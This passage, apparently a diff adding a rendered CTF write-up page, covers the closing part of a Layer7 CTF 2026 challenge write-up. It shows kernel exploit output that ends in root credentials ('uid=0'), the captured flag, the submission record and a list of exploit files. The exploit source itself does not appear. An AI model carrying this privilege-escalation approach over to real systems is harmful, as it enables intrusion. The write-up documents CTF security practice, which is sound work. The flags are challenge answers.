+[*] call #2 -&gt; 0xffffffffc052a2b0 (enc 0x6a71d1e9bb0673a3)
+[*] send #2 returned, result=0x0
+[*] cred patched: uid=0 euid=0
+[+] FLAG: Layer7{43837d8375d546a39db46ef0b86994ea637c123700d5ffc8e5e77337478df6b8}
+
+EXPLOIT_RC=0
+</code></pre></div>
+<p>Submission (<code>python3 l7.py submit 7 '...'</code>):</p>
+<div class="highlight"><pre><span></span><code>200 {
+  &quot;correct&quot;: true,
+  &quot;ctf_state&quot;: &quot;active&quot;
+}
+</code></pre></div>
+<p><code>work/7/submit.json</code>:</p>
+<div class="highlight"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;submitted_at&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2026-11-21T02:48:22.620258+00:00&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;challenge_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;7&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;flag&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Layer7{43837d8375d546a39db46ef0b86994ea637c123700d5ffc8e5e77337478df6b8}&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;http_status&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">200</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;response&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nt">&quot;correct&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;ctf_state&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;active&quot;</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>Files in <code>work/7/</code>:</p>
+<ul>
+<li><code>exploit.c</code> — annotated exploit source</li>
+<li><code>exploit</code> / <code>exploit_musl</code> — static builds</li>
+<li><code>remote.py</code> — uploader/runner over <code>nc</code></li>
+<li><code>remote.log</code> — full remote transcript</li>
+<li><code>disasm.txt</code>, <code>reloc_disasm.txt</code> — module disassembly</li>
+<li><code>rootfs/</code>, <code>initramfs_test*.cpio.gz</code> — local test initramfs</li>
+<li><code>submit.json</code> — submission proof</li>
+</ul>
+<h2 id="flag">Flag<a class="headerlink" href="#flag" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>Layer7{43837d8375d546a39db46ef0b86994ea637c123700d5ffc8e5e77337478df6b8}
+</code></pre></div>
+<h2 id="evidence_1">Evidence<a class="headerlink" href="#evidence_1" title="Permanent link">&para;</a></h2>
+<h3 id="platform-submission">Platform submission<a class="headerlink" href="#platform-submission" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;submitted_at&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2026-11-21T02:48:22.620258+00:00&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;challenge_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;7&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;flag&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Layer7{43837d8375d546a39db46ef0b86994ea637c123700d5ffc8e5e77337478df6b8}&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;http_status&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">200</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;response&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nt">&quot;correct&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;ctf_state&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;active&quot;</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+<p><img alt="Platform submission" src="../../assets/7-dead-letter/00-platform-submission.png" /></p>
+<h3 id="captured-solver-transcript">Captured solver transcript<a class="headerlink" href="#captured-solver-transcript" title="Permanent link">&para;</a></h3>
+<p>Full raw log: <a href="../../evidence/7-dead-letter-transcript.txt"><code>evidence/7-dead-letter-transcript.txt</code></a></p>
+<p><img alt="Solver transcript" src="../../assets/7-dead-letter/01-solver-transcript.png" /></p>
+<h2 id="flag_1">Flag<a class="headerlink" href="#flag_1" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>Layer7{43837d8375d546a39db46ef0b86994ea637c123700d5ffc8e5e77337478df6b8}
+</code></pre></div>
+<blockquote>
+<p>Submitted and accepted on the platform at <code>2026-11-21 09:48:22+07:00</code> (Asia/Jakarta).</p>
+</blockquote>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+  <script>var tabs=__md_get("__tabs");if(Array.isArray(tabs))e:for(var set of document.querySelectorAll(".tabbed-set")){var labels=set.querySelector(".tabbed-labels");for(var tab of tabs)for(var label of labels.getElementsByTagName("label"))if(label.innerText.trim()===tab){var input=document.getElementById(label.htmlFor);input.checked=!0;continue e}}</script>
+
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      Layer7 CTF 2026 · write-ups by B0TCIL
+    </div>
+  
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.sections", "navigation.top", "navigation.tracking", "navigation.path", "navigation.indexes", "toc.follow", "search.suggest", "search.highlight", "content.code.copy", "content.tabs.link"], "search": "../../assets/javascripts/workers/search.d50fe291.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.13a4f30d.min.js"></script>
+      
+        <script src="../../javascripts/nx.js"></script>
+      
+    
+  </body>
+</html>
